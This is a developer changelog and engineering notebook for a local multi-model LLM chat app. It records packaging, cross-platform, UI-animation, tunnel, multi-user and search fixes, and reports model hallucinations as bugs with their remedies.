**Reasoning arrives in `delta.reasoning`, not `delta.content`.** mlx_lm
streams a reasoning model's chain of thought in its own field. The parser read
only `content`, so Gemma 4 appeared to answer with *nothing* — and because
Gemma 4 is the preferred merger, every blended answer died with "the server
answered but sent no usable completion". `reasoning` is now wrapped in
`<think>` tags and flows into the same collapsible block DeepSeek R1 uses.

**Native reasoning is requested OFF** via
`chat_template_kwargs: {"enable_thinking": false}`. Gemma 4 26B does not
converge: asked for a taco recommendation it emitted 11,937 characters of
deliberation, hit the token ceiling and returned no answer at all, in 77
seconds. The same question answers in 8.9s with thinking off, and a five-draft
merge went from *15k characters of thought and no answer* to a clean merge in
5.2s. Templates that don't know the flag ignore it, so it is safe to send to
every model. `run_model(..., thinking=True)` can still opt back in.

**Never feed reasoning back into a prompt.** It runs many times longer than
the answer it precedes, so an unstripped draft blows straight past the
1,500-character merge truncation and buries the actual answers. `strip_think()`
is applied to council drafts, titles and extracted memories; only the text
streamed to the user keeps its `<think>` block.

**Two CSS animations on one property: the last in the list wins, silently.**
The wordmark already ran `hueshift`, which animates `filter`. Adding a fly-in
that also animated `filter: blur()` meant one of them was simply discarded —
no warning, no console error, the blur just never rendered and the effect
degraded to a bare scale. `hueshift` is now dropped for the duration of the
fly-in. Related: setting `animation` on a class **replaces** the whole list
rather than adding to it, so `#hero h1.flyin` has to restate `rainbow`.

**Temporal dead zone kills the whole script silently.** A `let` referenced
during boot before its declaration throws, aborting everything after it —
with no console error if the tab attached late. Declare shared state at the
top. Syntax-check the served page (`node --check`) as part of verification.

**Keep every `.ps1` pure ASCII.** Windows PowerShell 5.1 reads a `.ps1` with
no BOM as the ANSI codepage, not UTF-8. A UTF-8 em-dash (`E2 80 94`) therefore
arrives as three CP1252 characters, and the last of them is **U+201D, a curly
double quote — which PowerShell honours as a string delimiter.** One dash in a
*comment* silently desynced the quoting for the remaining 90 lines, so the
parser reported errors inside comments and an unterminated string at the end
of the file, with nothing wrong at any of those places. `build_windows_exe.ps1`
now carries a note to that effect and is checked with
`raw.decode("cp1252") == raw.decode("utf-8")` — if that holds, the encoding
cannot bite.

### macOS packaging

**The app icon should fill 82.4% of its canvas, not Apple's 80.5%.** The
strict macOS grid is an 824px body inside 1024, but nothing actually ships at
that: measured across every app installed here, Canva 82.6%, Ollama 82.4%,
Signal 82.3%, Firefox 82.2%, Sublime 82.2% — a tight cluster at **844/1024**.
Ours started at 897px (87.6%) and loomed over its Dock neighbours; rebuilt at
824 it read as visibly small. 844 matches the room. Rebuild by cropping to the
opaque bbox, resizing to 844, centring on a transparent 1024 canvas, and
running `iconutil` over a full 10-size iconset — the original was missing the
16×16 and 32×32 @1x variants the menu bar and list views use.

**Finder only persists a DMG window size if it sees the bounds *change*
while frontmost.** Set them twice with a one-pixel nudge.

**Apply the volume icon *after* the Finder styling pass** — that pass deletes
`.VolumeIcon.icns` and clears the custom-icon flag.

**Stale mounts break builds.** A leftover `/Volumes/MillenAI …` makes the
styling step fail with "Can't get disk". The script now detaches first and
waits for the volume to appear.

**macOS 15+ removed right-click → Open.** Unnotarized apps must be allowed
via System Settings ▸ Privacy & Security ▸ Open Anyway. The DMG artwork
explains this in three numbered steps. Ad-hoc signing (free) does *not*
satisfy Gatekeeper — only paid notarization does. AirDrop sets no quarantine
flag at all and sidesteps the whole thing.

---

## Windows / CUDA

A platform layer now covers both OSes from one `millenai.py`. `IS_MAC` /
`IS_WIN` / `IS_ARM` drive the branches; everything else is shared.

| Concern | macOS | Windows |
|---|---|---|
| Inference | MLX (Apple silicon) → Ollama fallback | Ollama only — **CUDA automatically** |
| Speech-to-text | `mlx-whisper` large-v3-turbo | `faster-whisper` CT2 turbo, CUDA fp16 → CPU int8 |
| Text-to-speech | `say` | PowerShell SAPI |
| GPU telemetry | `ioreg` Device Utilization % | `nvidia-smi --query-gpu=utilization.gpu` |
| Chip label | `sysctl` brand string | GPU name, e.g. `RTX 4090` |
| Data dir | `~/Library/Application Support/MillenAI` | `%LOCALAPPDATA%\MillenAI` |
| Ollama engine | `ollama-darwin.tgz` (146 MB) | amd64 zip (1.5 GB, bundles CUDA) or arm64 zip (209 MB, CPU-only) |
| Package | DMG + `.app` | `MillenAI-<ver>-Windows.zip` + `.bat` launcher |
| In-place update | yes (swaps the bundle) | not yet — points at the release page |

**Built on macOS, by `./build_windows.sh`** — and `release.sh` runs it, so
every release publishes the DMG *and* the Windows zip as assets. There is
nothing to compile: the package is `millenai.py` plus a `.bat` and a README,
so the output is identical whatever machine builds it. This replaced
`build_windows.ps1`, which could only run on Windows — keeping two copies of
the launcher and readme text would have guaranteed they drifted.

**CUDA is not built, it is downloaded.** Ollama's Windows amd64 build bundles
the CUDA runtime; the app fetches it on the user's PC and Ollama offloads to
the GPU by itself. So "a CUDA version" isn't a build target — there is one
Python file that runs everywhere.

The `.bat` and README are written through a CRLF filter. `cmd.exe` is
unforgiving about bare LF in a batch file, and PowerShell's `Set-Content` had
been supplying CRLF for free.

**Windows-on-ARM must run the app as emulated x64.** Not a preference — a
hard dependency wall. `pythonnet` 3.1.0 (pywebview's Windows backend; there
is no alternative, `cefpython3` stopped at Python 3.7) publishes a single
`win32.win_amd64` wheel, and `ctranslate2` 4.8.1 (faster-whisper) is
`win_amd64` only. On an ARM64 Python both fall back to building from source
and fail, so the window never opens. Install the x64 python.org build; Win11
emulates it transparently.

Ollama stays **native ARM64** regardless, because it is a separate process
reached over HTTP — the architecture of the Python process is irrelevant to
it. Emulation cost therefore lands on the UI, where it is invisible, not on
inference. This is why `IS_WIN_ARM` comes from `IsWow64Process2` (the
*machine*) and not `platform.machine()` (this *process*): an emulated x64
process reports `AMD64` and would otherwise pull the 1.5 GB CUDA build onto
a machine that can never load it.

**Windows-on-ARM has no CUDA** — no NVIDIA support exists for it, so those
machines are CPU-only whichever build they run.

**CUDA needs no code.** Ollama detects an NVIDIA GPU and offloads on its own;
the Windows zip ships the CUDA runtime. A 4090 will comfortably outrun an
M4 Pro here.

### The MSI (built in CI)
`.github/workflows/windows-installer.yml` — every published release gets
`MillenAI-<ver>-x64.msi` attached automatically: a windows-latest runner
builds the exe with `build_windows_exe.ps1` (PyInstaller cannot
cross-compile, so the Mac that cuts releases can never do this itself), then
WiX (heat harvest → candle → light) wraps `dist\MillenAI` in a per-user MSI —
no admin, Start Menu + desktop shortcuts, uninstaller in Settings.
`workflow_dispatch` with a `tag` input backfills old releases.

Two CI gotchas that cost an iteration each: **the checkout must not be the
release tag** — packaging files postdate old tags, so build scripts come from
main and only `millenai.py` + the icon are pinned to the tag; and **PowerShell
does not interpolate `-dVer=$ver`** — a token starting with `-` and containing
`=` passes literally unless quoted (`"-dVer=$ver"`), which candle reports as
version '$ver'.

### Status: written, not yet run on Windows
No Windows machine or NVIDIA GPU was available. What *was* verified, by
forcing the Windows branches on a Mac: paths resolve under `%LOCALAPPDATA%`,
all 17 models route to Ollama with zero MLX, the correct Ollama zip and
CT2 Whisper repo are selected, `nvidia-smi` output parses into both the GPU
percentage and an `RTX 4090` chip label, and speech builds a PowerShell SAPI
command with markdown stripped. macOS was re-tested end to end afterwards
(chat, telemetry, voice, transcription) and is unchanged.

Expect first-run friction on Windows: Python must be installed manually,
SmartScreen will warn about an unknown publisher, and `faster-whisper` needs
a working CUDA/cuDNN install for GPU transcription — it falls back to CPU
rather than failing.

## 1.8.0 — window-wipe boot, slat warp, the hardware ladder, go-live

### Window-wipe boot (Mac native only)
The NSWindow is born transparent (`setOpaque_(False)`, clear background,
WKWebView `drawsBackground` off via KVC) and the page starts with
`html.winwipe`: body clipped to `inset(0 0 0 100%)`, so launching the app
wipes the UI in RIGHT-to-left over the desktop, and the rainbow wash then
answers LEFT-to-right — always from the opposite side. Traps, learned hard:
* **Canvas propagation** — body's background paints the whole viewport even
  when body is clipped. During the wipe the background lives on
  `body::before` (z-index -99), which clips with everything else.
* **Occlusion** — no rAF, no animationend. `winWipeFinish` has a 1.6 s
  timeout; the classes are always dropped, the page always appears.
* **Remote visitors** share the server but sit in a real browser where a
  transparent page flashes white — the head script gates on
  `location.hostname` being 127.0.0.1/localhost.
* The native window re-solidifies by an **NSTimer at 2 s** (opaque, #212121,
  shadow + `invalidateShadow`) — deliberately not a JS bridge, so a dead
  page still yields a normal window. All AppKit/WebKit selectors dry-run
  in the app venv (`pyobjc` is not in system python).
* Boot order: kickWipe → winWipeRun (double rAF so the clipped state
  commits first) → winWipeFinish → rainbowWipe. Performance mode and
  non-Mac/browser serve skip straight to rainbowWipe.

### The warp is now VERTICAL SLATS (user-picked from a live A/B)
~28 CSS-px-wide strips, THREE rows tall, no spin, no radial rotation:
each slat keeps its own depth speed (`zj .82+rand*.5`), rushes the viewer
with true 1/z perspective, and motion-stretch runs along the slat's LENGTH
(`vstr`, ×5) so speed reads as longer lines, never sideways smear. Lateral
drift is small (`.035`) and proportional to (1−z), so settling is exact:
z pulls home at `dt*5`, scatter collapses to zero, the intact video fades
up underneath. Square-shard and spin variants are dead — "split into long
vertical lines and just zooms" is the spec, and it must "settle neatly".
Tuning harness: scratchpad/warp.html (synthetic skyline — the pane blocks
the Apple CDN — with `setGen()`/`step()` because the pane starves rAF).

### The hardware ladder (catalog 2.0 groundwork)
`HW_CLASSES` groups the sidebar by the MACHINE a model needs (Everyday /
Performance 32 GB / Flagship 64–96 GB / Titan 128 GB+), and
`model_fits_machine` (needs ≤ 75% of total RAM) HIDES what can't fit —
sidebar, add-models panel, and setup all filter. New verified rungs (HF +
Ollama registries, 2026-08-01): GPT-OSS 20B/120B, Qwen 3.6 27B/35B-A3B,
Llama 3.3 70B (now MLX too), Llama 4 Scout, Qwen 3 235B-A22B, GLM-5.2 and
DeepSeek R1 671B (MLX-only, 512 GB-class). `STARTER_LABELS` is now the
AUTOSELECT: best fitting pick per tier only (~25 GB on a 48 GB Mac, three
models), not every pick that fits (~118 GB — the bug this replaced).
NB: this Mac is 48 GB total, budget 36 GB — the 70B correctly vanishes here.

### go-live.sh — the always-on, self-updating instance
One idempotent script: managed clone in `~/Library/MillenAI-live` pinned to
the newest `v*` tag, LaunchAgent serving HEADLESS on :9889 (8890 was a trap —
it's Gemma 2 9B's engine port; engines own 8884–8930), 6-hourly updater
(fetch tags → checkout → `launchctl kickstart`), Cloudflare named tunnel at
ai.millertechnology.net once `cert.pem` exists (the login click is the one
human step; the script opens the page and waits, and everything else
installs regardless). Needs `MILLENAI_HEADLESS=1` (no window, no
webbrowser.open) and `MILLENAI_PORT` — both shipped in 1.8.0, so the live
instance only works from v49 tags onward. The access key lives in
`~/Library/MillenAI-live/key` (0600), never in the repo.

### 1.9.x — the door, and why the web skyline was black
1.9.0 replaced the plain-text 403 with THE DOOR: the bare public URL shows
a styled key box (wrong key = note, API paths keep the terse 403), so the
shareable address is just ai.millertechnology.net + a spoken key.
1.9.1: the skyline never played on the https tunnel because the phobos
clip URLs are http-only (its https cert is broken — curl exit 60) and
browsers hard-block http media on an https page, silently. The clips now
come from sylvan.apple.com (tvOS-13 CDN, valid TLS, H.264/AVC so every
browser decodes them — the 2x/entries.json variants are HEVC-only, which
Firefox can't play). NYC URLs live in Apple's resources-13.tar
entries.json; guessing `NY_*_2K_SDR_HEVC.mov` names 404s.

## 1.10.0 — the server owns the skyline; the web got people

### Skyline: cache + remux, never stream the CDN to a browser
The sylvan AVC files are `ftyp/wide/mdat/moov` — the moov INDEX sits after
370 MB of data, so a browser has nothing to play until the entire file
arrives ("background not loading", again). The server now downloads each
clip once, remuxes it fast-start in PURE PYTHON (recursive moov walk,
stco/co64 offsets shifted by exactly len(moov) — a naive byte-scan for
'stco' can hit sample data), caches under app_dir()/sky, and serves
/sky/<i>.mov same-origin with real Range support (Safari scrubs with
dozens of byte-range requests, including suffix ranges `bytes=-N`).
`/api/sky/status?i=` drives the macOS-style #skyload bar while a clip
warms. Verified in-browser: remuxed file plays in ~6s and the reveal
unhides; atom order ftyp/moov/wide/mdat; both range forms 206.

### Multi-user: nobody sees Patrick's chats through the tunnel
Remote requests are the ones carrying Cf-Connecting-Ip/X-Forwarded-For
(cloudflared adds them; local/native requests never have them). Remote
visitors with no identity get the WELCOME page (name + 4-12 digit PIN;
"Continue with Google" appears once app_dir()/google_oauth.json holds a
client_id/client_secret). Identity = sha256 hash → cookie `millen_user`
(HttpOnly) → all chats/memory/prefs live under app_dir()/users/<id>/.
Every storage function takes `base=None`; None = legacy owner files,
which a remote request can NEVER reach (cookieless remotes get a shared
`_anon` pen). A wrong PIN is just a different empty profile — that is the
security model, not a bug. Verified: owner/buddy/anon fully isolated in
both directions, desktop app untouched.

### Warp: slats now shoot DIAGONALLY
Per Patrick ("more diagonal like stars shooting"): the slat field drifts
up-right (.28/-.16, jittered by zj) and leans ~7° into the motion, both
scaled by scat=(1-z) so the settle still lands pixel-exact. Vertical
motion-stretch unchanged.

### 1.10.2 — warp: more split, and optimized
More fragments (44px slats, FOUR rows, zj .7+.9, scatter .05, rate
.45+2.8e, WARP_UP 1.1) and two render optimizations that keep the look
identical: the video is drawn ONCE per frame into a 1280-wide snapshot
canvas and every slat blits canvas->canvas (the per-tile video reads were
the cost), and the warp canvas caps at 1.5x DPR (invisible on fast-moving
slats, nearly halves fill). Snapshot only happens while the warp is
active — idle cost is zero. Tiles rebuild if the snapshot dims change.

## 1.11.0 — needle streaks, guarded singles, hardened web, Claude-grade voice
* Warp: ~1800 needle-fine streaks (22px cells, thickness .32 of cell and
  thinning further with speed via /sqrt(len)) — "tesla launch mode".
* Single-model streams now run through _stream_guarded too; a collapse is
  cut back to its coherent prefix by _detruncate (repetition loop like
  "a walking path" x300 reached the reader unguarded before).
* Security: constant-time key compares (secrets.compare_digest), ADMIN
  endpoints (downloads, updater, open-logs, speak, voice/prepare) 403 for
  remote visitors — guests chat, they don't operate the host. Server was
  already localhost-bound; renderMD already escapes model HTML.
* PIN minimum is 8 digits (client + server).
* SYNTH_INSTRUCTION carries the voice spec (lead with the answer, prose
  over bullets, no filler, length matched to the question) — the merge is
  where the final answer's personality is written; SYSTEM_PROMPT aligned.

## 1.13.0 — the masterpiece pass
* THE SLAM replaces the bloom at wash-impact (2.3s): two conic-rainbow
  shockwave rings (ring shape cut by a radial mask), a screen flash
  centred on the wordmark (--fx/--fy custom props), an 18-spark burst
  (per-spark --dx/--dy/--hue), chromaSnap on the h1 (red/cyan ghosts at
  ±14px snapping together with overshoot), and a decaying quake on #main.
  All CSS-driven; perf mode kills the lot. Verified by frozen-frame
  (paused animations at negative delays).
* Google SSO is LIVE end-to-end: project "millenai" under the
  millertechnology.net org, client "MillenAI Web", redirect
  https://ai.millertechnology.net/auth/google/callback, audience External
  + In production (no verification needed for openid/email). Secret went
  clipboard->google_oauth.json (0600), clipboard cleared, never displayed.
  GOTCHA: curl with a spoofed Cf-Connecting-Ip header gets Cloudflare
  error 1000 — CF rejects requests carrying its reserved headers; test
  remote behaviour with plain requests through the tunnel instead.
* Reliability run (live engines): Llama 3.2 3B passed the exact
  central-park looper prompt post-guard (2995 chars, max 3-gram x5);
  Hermes 3 8B clean. NB: offline single models hallucinate facts
  confidently (Hermes invented a "Hot Dog Palace") — that is what Live
  web search is for. Voice prompts now push generous, human answers.
* First-run: "N models fit in your memory", button "Send it" -> "LFG".
* Dock icon: the icns body is already 922px/90% (bigger than Apple's
  824px standard) in BOTH repo and installed app — the "tiny icon" is
  macOS icon-cache staleness. lsregister -f + Dock restart applied; the
  system store (/Library/Caches/com.apple.iconservices.store) needs sudo.

## 1.13.0 — vision: paste an image, MillenAI reads it
Paste (⌘V) an image into the composer: client downscales to ≤1280px JPEG,
shows removable chips, sends `images:[dataURL]` beside the text. Server:
any request with images routes WHOLE to LLaVA Vision 7B on Ollama's
NATIVE /api/chat (per-message `images:[raw-base64]` — strip the dataURL
prefix), tier/council/web-search all bypassed ("vision answers come from
the pixels"). Empty text gets a default "describe this" prompt. If LLaVA
isn't pulled yet the request kicks its download and says so instead of
erroring. Verified end-to-end: a 1x1 red PNG came back described as "a
solid red background". Guarded stream path applies to vision too.
Also in 1.12.7: _looks_degenerate now judges the TAIL (last 120 words
< 0.25 unique) — a collapse behind a healthy preamble amortized the
whole-text ratio to 0.33 and "party" x600 reached a phone.

## 1.15.0 — the pixel-aware VFX trio
Same-origin video (since the sky cache) un-tainted the canvas, making
getImageData LEGAL for the first time. Three effects ride it:
* CITY LIGHTS ANSWER YOU: a 160x90 probe of the live frame harvests the
  brightest real pixels (windows/headlights/stars) every ~420ms during
  generation; up to ~140 motes drift viewer-ward in their TRUE colours,
  drawn with a cheap two-circle glow (no shadowBlur) under 'screen'.
* LONG-EXPOSURE TRAILS: the warp canvas fades via destination-out
  (alpha .28) instead of clearRect while active — streaks leave phosphor.
  Calm path still hard-clears; motes purge on settle.
* HYPERLAPSE THINKING: vid.playbackRate = 1 + e*5 — the city races to ~6x
  while a model works and eases home with the settle. The tiles sample
  the live frame, so the streaks carry the accelerated footage.

### The TDZ rule (three strikes tonight)
`tiles`, then `agent`, then `sndOn`: a `let` used by ANY code that runs
earlier in the script kills the WHOLE page silently (typeof does NOT
save you — TDZ throws on typeof too). Every shared mutable `let` now
belongs at the TOP of the script next to `messages`. Diagnosis trick
that found all three: re-execute the page's own script text via
`new Function(src)()` in the console and read the thrown line.

## 1.20.0
- File upload: 📎 in the composer. Images join the vision pipeline
  (shared addImageFile with paste), text-like files ride as ATTACHED FILES
  blocks in the last message (2 max, 50k chars each, auto_web off).
  Doc chips reuse the imgchips strip. Smoketest: ZEBRA-42 retrieval.
- Fast + Smart MERGED into "Fast" (strongest fitting model, count 1).
  Aliases in BOTH places: client localStorage may hold "Smart", old
  clients may POST tier:"Smart" — both map to Fast. Smoketest keeps a
  legacy-alias check.
- ACCESS KEY DOOR RETIRED per Patrick: _gate() returns True; the welcome
  screen (name+PIN, Google SSO button when configured) is the front door.
  Old /?key= links land on the app harmlessly. ADMIN_PATHS + per-identity
  storage are the real protection now. GATE_PAGE is dead code.
- Sidebar 340px; controls row order: version pill, UPDATE, (spacer),
  newchat, gear. The .tag moved OUT of #brand — selector is #brand-row .tag.
- Wordmark is HOLLOW: gradient lives in the stroke. Trick: background-clip
  clips gradient to text+stroke, then a SOLID -webkit-text-fill-color
  paints the fill back on top, leaving gradient only in the ring.
  51px/800, drift slowed to 52s. Chameleon vars unchanged.
- Hero: halo opacity .85->1 + blur 16->19 (the "+20% glow"); greet 48px;
  LIVE fill rgba(85,85,85,.5).
- Agents list folds like the tier dropdown (#agents-wrap.closed). Boot
  always opens the AI tab and CLEARS any stored agent (per-session now).
- Telemetry: meters 4px; t-head 12.5px nowrap (13.5 wrapped M4 PRO into
  the models count at 340px).
- GOTCHA: `pkill -f "MILLENAI_PORT=9894"` does NOT kill the server — env
  assignments aren't in python's argv; it kills the background *shell
  wrapper* only, orphaning the python (which keeps the port; the "new"
  server then silently fails to bind and you test STALE CODE). Kill by
  port: `kill $(lsof -tnP -iTCP:9894 -sTCP:LISTEN)`.
- GOTCHA: mlx_lm.server seeds its RNG identically at spawn — same prompt
  on a fresh engine can reproduce output byte-for-byte even at temp .75.
  Consequences: (a) identical-output "caching" mirages while testing,
  (b) a bare retry after a collapse can replay the SAME collapse — the
  guard's retry now appends an anti-repetition nudge to the last user
  message so attempt 2 takes a different path.
- Doc QA framing: question-first + raw ATTACHED FILES block made the 35B
  read ZEBRA-42 and then DENY it existed ("is this a prank?"). Files
  first, explicit "real data, answer factually" frame, QUESTION: last.
  Smoketest rejects denial-shaped answers, not just substring hits.
- 1.20.2 TUNNEL HEARTBEAT: Cloudflare drops a proxied response after
  ~100s without bytes. Engine swap + big-model load = multi-minute wire
  silence → remote council runs died as "network error" with zero drafts
  while every localhost test passed. Fix: heartbeat thread in the chat
  handler re-sends the last STATUS marker after >20s quiet (writes behind
  a lock, hb_stop.set() on every exit path). Verified by measuring
  inter-byte gaps through a full Thinking run: max 22.2s.

## 2.0.0
- ZERO-CLICK FIRST RUN: needs_setup now auto-POSTs /api/setup/install —
  the machine-sized starter set downloads with no button press; headline
  reads "NN GB memory detected". Endpoint stays owner-only, so remote
  guests can't trigger host downloads (their POST 403s silently).
- setup_status() gained mem_gb (psutil total, rounded).
- USERS row removed from telemetry; box is rgba(47,47,47,.5) + 14px
  backdrop blur (sidebar's frosted material).
- Context: ~/.cache/huggingface was manually deleted (Finder, 03:33) —
  five stale 70B ollama pulls freed 194GB; ladder re-downloaded via
  snapshot_download. NOT app code — nothing in MillenAI deletes that dir.
- 2.0.1 HOTFIX: audio removal left `audioCtx.resume()` inside send() —
  ReferenceError on EVERY send, silently (2.0.0, ~15 min in the wild).
  `x&&x.y` does NOT guard an undeclared identifier — same family as the
  TDZ rule: grep for EVERY identifier a removal deletes, including uses
  inside guards. send() is now wrapped (sendSafe): any exception paints
  "send failed — <msg>" into the composer instead of eating the click.
- 2.5.2 hardening: (a) stuck-download WATCHDOG in setup_status — a job
  10 min at the same pct flips to error instead of holding busy forever
  (Phi-4 wedged at 99% after my .incomplete sweep raced its writer);
  (b) _voice_ready keys on the weights symlink existing, NOT on carcass
  absence — a stale *.incomplete beside a finished blob bricked voice.
  Voice verified end-to-end: say -> /api/transcribe exact match, speak ok.

## 2.7 — FLEET (Contribute)
- Friends' GPUs answer hub queries: worker connects OUTBOUND via
  long-poll HTTP (25s poll < CF 100s window, no router config). Endpoints
  /api/fleet/{register,poll,submit} gated by X-Fleet-Key (fleet_key file,
  0600, auto-minted). /api/fleet/status is owner/local-only (shows key +
  workers). Router offloads SINGLE-model, non-vision jobs only; 150s
  wait; degenerate or timed-out results fall back to local silently —
  the fleet can only make things faster.
- Worker side: prefs contrib_on/url/key; contrib_apply() retires the old
  thread BEFORE starting (args are baked at spawn — an empty-key loop
  kept retrying forever after the key was fixed. Seen live.)
- Trust: workers see the prompts (incl. the hub user's memory in the
  system message). Friends only. UI: Settings › Contribute my GPU.
- Verified: two local instances, hub routed "why is the sky blue" to a
  registered worker, 377 chars in 5s, status line names the friend.
- 2.7.2 ONE-CLICK CONTRIBUTE: no URLs, no keys for friends. Worker knocks
  keyless (persistent wid in prefs) -> owner sees "X wants to contribute
  [Approve]" in Settings -> approval mints a token handed over in a
  ONE-TIME claim window (lost token = approve again). approve lives
  INSIDE the /api/fleet/ prefix branch (a standalone route after it was
  dead code — the prefix router ate it. Seen live.) Legacy shared-key
  workers still work. Hub URL defaults to FLEET_HOME; advanced fold
  keeps the override.
- 2.8 NO LIMITS: models-up arrow on the MODELS bar opens the plan panel;
  "No limits" checkbox (prefs no_limits, cached in _no_limits) makes
  model_fits_machine offer everything SUPPORTED and model_fits_memory
  stand down entirely (a 70B on 48GB swaps hard — explicit ask). The
  unlocked Max flagship is capped at <= physical RAM (70B yes, 120B no).
  GOTCHA: docstring-anchored inserts — model_fits_memory has NO
  docstring; the gate landed in weather_snippets and would have returned
  True for every forecast. Anchor on the def line, always.

## 2.10 — quality + fleet invite
- TWO-PASS ANSWERS (biggest local quality lever): single-model tiers now
  draft SILENTLY, then stream a self-revision (REVISE_INSTRUCTION). Same
  weights, markedly better prose — councils already had a critic step,
  single answers never did. Skipped for greetings/short prompts
  (_is_substantive), images, and web-data answers. Pref `polish`
  (default on) + Settings checkbox. Measured: 1583 -> 2664 chars.
- One-time "Share your GPU?" invite after the app is usable (prefs
  seen_share); Yes flips contrib_on straight to the fleet.
- REMINDER (cost me a test cycle again): a stale server holding the port
  means the new process silently fails to bind and you test OLD code.
  Always `kill $(lsof -tnP -iTCP:<port> -sTCP:LISTEN)` first.
- 2.10.1 SELF-HEALING ENGINES (root cause of "The engine returned
  nothing"): MillenAI instances SHARE engine ports 8884-8930, so the
  live service restarting (every release kickstart!) or any second
  instance exiting terminated engines the desktop was mid-use of.
  Fixes: (a) run_model respawns the MLX engine and retries on URLError
  AND on a silent/empty stream (once each); (b) stop_managed_engines
  leaves engines alone when a sibling MillenAI is listening on 8889/9889.
  Verified by killing the live engine pid mid-session: next query
  recovered with no user-visible error.
- 2.10.4 GATEKEEPER: the app is only AD-HOC signed (runs, but every
  download is quarantined) — the real fix is a $99/yr Apple Developer ID
  + notarization, which needs Patrick's enrollment. Until then: a help
  card fires WITH the download click on the web page, in the OS's own
  words (mac: "cannot be opened"/"Apple could not verify" -> System
  Settings > Privacy & Security > Open Anyway; win: SmartScreen "More
  info" > "Run anyway"). The DMG background already carries the same
  three steps.
- 2.12 TURBO (optional free cloud GPU): ~/…/MillenAI/cloud.json
  {"name","base","key","model"} enables an OpenAI-compatible endpoint
  (Groq / Cloudflare Workers AI / OpenRouter / Together all fit, all have
  free tiers). Switch in Settings appears ONLY when the file exists, and
  prompts leave the machine only while it is on; any failure falls back
  to local silently. The key is never entered through the UI or chat.
  NOT usable: Colab/Kaggle notebooks — their terms forbid using them as
  a remote inference server.
- 2.12.1 TURBO GOTCHA: provider edges (Groq behind Cloudflare) 403 a bare
  `Python-urllib` UA with "error code: 1010" — cloud_stream now sends a
  real User-Agent + Accept. curl works where urllib doesn't; if a
  provider "tests fine in turbo.sh but says unavailable in-app", that is
  the fingerprint. Also: the revise pass had to be told not to open with
  "Here's a rewritten version".

## 2.14
- THE WARP IS RETIRED (Patrick: "too much GPU and too laggy"). starTick
  is a no-op that hides #stars; no canvas, no per-frame video reads. The
  moment is carried by CSS only: body.gen dims #skyline, and the
  streaming answer wears a bottom mask so the newest line emerges from
  transparency (.msg.ai.live). paintBrandFromSky now samples the VIDEO
  directly — it used to read the warp's snapshot canvas, which no longer
  exists.
- Backdrop rotates per launch again (loading bar is the point) and the
  New backdrop button is gone.
- Greetings got a New York accent.
- 2.14.2 BACKDROP VARIETY: the picker only ever chose from the CACHE, and
  the LRU held 6 — so the same six clips cycled forever even though all
  89 were "eligible". Fixes: reach for an uncached clip on ~45% of
  launches (or always while the cache is thin), never repeat the last
  clip, LRU 6 -> 12 (~2.6 GB), and one background prewarm per launch.
  Modelled over 400 launches: 82 distinct clips.
- 2.14.5 "engine returned nothing", ROOT CAUSE (2nd time): the sibling
  check in stop_managed_engines listed only ports 8889/9889, so a dev
  instance on ANY other port (mine on 9899) killed the desktop's shared
  engines on exit. Now it pgrep's for millenai.py — any sibling process
  spares the engines. Plus a last-resort guarantee: if the whole chat
  pipeline emits ZERO bytes, retry on the smallest cached model and, if
  that is silent too, say so in plain language. A reply is never blank.

## 2.15 — Fable-grade voice
- CALIBRATION over inflation: the "always 2-3x longer" mandate made
  simple questions insufferable. The prompt now matches depth to the ask
  (tight+priced for quick facts, full treatment for meaty ones), demands
  specifics over hedges, and bans closing fluff ("In conclusion", offers
  to help further). One worked micro-example anchors the quick register.
  REVISE + SYNTH calibrate too (complete beats long).
- Turbo upgraded to openai/gpt-oss-120b on Groq (was llama-3.3-70b) —
  found via /models on the configured key; turbo.sh default matches.
- 2.16.1 VRAM-AWARE SIZING: machine_budget_bytes used 75% of SYSTEM RAM,
  which is right for Apple's unified pool and wrong for a discrete GPU —
  a 165 GB PC with a 24 GB 3090 was offered a 120B that would spill to
  CPU and crawl. Now: budget = min(RAM*0.75, VRAM*1.25) whenever
  nvidia-smi reports a card (cached; Mac unaffected). Simulated:
  165GB+3090 -> 30 GB budget, flagship Qwen 35B MoE (fits the card).
- 2.16.2 TURBO PROVIDERS: added Anthropic's native dialect to
  cloud_stream (x-api-key + anthropic-version + /v1/messages +
  content_block_delta SSE; system prompt hoisted out of messages) and
  Google Gemini via its OpenAI-compatible endpoint (needs no new code).
  turbo.sh now offers Groq / Gemini / Claude / xAI / OpenRouter /
  Cloudflare and tests each in the right dialect.
  NOTE: there is no free Claude API — it is paid per token, a Claude.ai
  or Claude Code subscription does NOT grant API access, and proxying
  subscription credentials would breach Anthropic's terms. Gemini's free
  tier is the free frontier-class option.
- 2.17.3 DUPLICATE-ID TRAP (again): #about-card is shared by THREE
  dialogs (settings, update, new-models). The settings restructure moved
  padding into #about-head/#about-body/#about-foot, which the small
  cards don't have — so their buttons ran to the card edge. Scoped
  padding added via #update-veil/#new-veil #about-card. Renaming those
  ids is still the real fix.
- 2.17.5 LIVE DATA: business-hours question got FABRICATED hours + a 555
  phone number (seen live). Three-layer fix: (a) needs_search learns
  local/live-fact triggers (hours, open now, phone number, address,
  menu, showtimes…, plus is/when…open patterns) — over-searching is
  cheap, an invented phone number is not; (b) system prompt bans
  inventing verifiable specifics outright; (c) place-shaped searches get
  the weather treatment — snippets are the ONLY source, unverified means
  say so. Live: same query now cites real sources, flags their
  disagreement, invents nothing.

## 3.1 — place answers + backdrop pool
- PLACE ANSWERS Gemini-shaped: placey searches use run_search_deep
  (snippets + readable text of the top 2 result pages via _page_text —
  the hours live in pages, not blurbs) and a strict ANSWER SHAPE:
  verdict first, <=3 bold-name lines, one heads-up, <=120 words.
- ROOT CAUSE of the fabricated restobar essay: the message started with
  "Hey", and _NO_SEARCH fires on greeting-PREFIXED messages, so search
  never ran. needs_search now strips a leading greeting before judging.
- BACKDROPS: LRU 12 -> 30 (~6.6 GB); 10-min in-session trickle keeps
  warming uncached clips; skyhist (last 8) prevents repeats. The pool IS
  the rotation — it has to be wide.

## 3.3 — place search that actually finds places
- "is ables in bushwick open" -> "I couldn't find any information" at
  0.9 tok/s. Three separate causes, all fixed:
  1. THE ENGINE: default DDG backend returned neighborhood listicles;
     bing found the actual business (an Instagram-only steakhouse). All
     searches now go through _ddg_text(), which tries bing -> auto ->
     duckduckgo — engines rate-limit individually for ~a minute, so one
     strike must never mean "no results".
  2. THE QUERY: the raw conversational prompt was sent verbatim.
     place_search() strips filler (_PLACE_FILLER) to entity+locality
     ("ables bushwick"), runs three variants, and match-checks results:
     a direct hit must contain the anchor AND next term as WHOLE WORDS
     ("pool tables" must not count as "ables"; "Ables" obituaries have
     the name but not the place).
